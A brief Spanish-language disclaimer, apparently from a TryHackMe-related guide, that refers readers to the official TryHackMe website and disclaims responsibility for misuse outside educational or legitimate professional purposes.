**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
